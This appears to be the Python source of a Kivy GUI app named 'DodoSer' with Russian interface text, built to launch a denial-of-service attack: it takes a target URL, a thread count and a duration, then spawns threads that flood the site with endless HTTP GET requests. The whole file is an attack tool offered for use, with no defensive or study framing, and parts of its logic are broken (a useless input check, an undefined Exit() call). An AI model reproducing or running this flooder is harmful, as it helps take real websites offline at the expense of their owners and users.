

from kivy.app import App
from kivy.lang import Builder
from kivy.uix.boxlayout import BoxLayout
from kivy.properties import StringProperty
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput

import threading
import requests
import time

KV = """
MyBL:
		orientation: "vertical"
		size_hint: (0.95, 0.95)
		pos_hint: {"center_x": 0.5, "center_Y": 0.5}

		url: URL_site.text
		threads_str: threads_input.text
		timeAttack_str: time_input.text
		Label:
				font_size: "30sp"
				text: root.data_label
		Label:
				size_hint: (1, 0.5)
				id: console
				font_size: "10sp"
				text: root.console_label

		TextInput:
				id: URL_site
				multiline: False
				hint_text: "URL"
				background_color: '#303030'
				halign: 'center'
        		padding_y: [self.height / 2.0 - (self.line_height / 2.0) * len(self._lines), 0]
				padding_y: (5,5)
				size_hint: (1, 0.5)

		TextInput:
				id: threads_input
				input_filter: "int"
				background_color: '#303030'
				halign: 'center'
				hint_text: "Threads"
        		padding_y: [self.height / 2.0 - (self.line_height / 2.0) * len(self._lines), 0]
				multiline: False
				padding_y: (5,5)
				size_hint: (1, 0.5)

		TextInput:
				id: time_input
				input_filter: "int"
				background_color: '#303030'
				halign: 'center'
				hint_text: "time(minutes)"
        		padding_y: [self.height / 2.0 - (self.line_height / 2.0) * len(self._lines), 0]
				multiline: False
				padding_y: (5,5)
				size_hint: (1, 0.5)

		Button:
				text: "Начать Атаку"
				bold: True
				background_color: '#303030'
				size_hint: (1, 0.5)
				on_press: root.startAttack()
		Label:
				size_hint: (1, 0.25)
				font_size: "10sp"
				text: root.MyName
"""

class MyBL(BoxLayout):

	info_True = False
	data_label = StringProperty("DodoSer")
	console_label = StringProperty("console")
	MyName = StringProperty("Kredao")

	url = StringProperty()
	threads_str = StringProperty()
	timeAttack_str = StringProperty()
	
	def startAttack(self):

		info_True = False

		if not self.url.__contains__("http"):

			threads = int(self.threads_str)
			self.ids['console'].text = 'URL-адрес не содержит http или https!'
		elif not self.threads_str.__contains__(""):

			self.ids['console'].text = 'Вы не ввели количество потоков'
		else:

			threads = int(self.threads_str)
			info_True = True
			one = time.perf_counter()
			self.ids['console'].text = 'Информация подтверждена. Запуск атаки!'

		while info_True:

			def dos(target):
				while True:
					try:
						res = requests.get(target)
						self.ids['console'].text = 'Атака началась'
					except requests.exceptions.ConnectionError:
						self.ids['console'].text = "[+] " + "Ошибка подключения!"

			for i in range(0, threads):
				thr = threading.Thread(target=dos, args=(self.url,))
				thr.start()
				self.ids['console'].text = 'Поток запущен'

			two = time.perf_counter()
			timeAttack = int(self.timeAttack_str)
			tim = two - one
			if tim >= timeAttack * 10:
				Exit()

	
class MyApp(App):
	running = True

	def build(self):
			
		return Builder.load_string(KV)

	def on_stop(self):
		self.running = False

MyApp().run()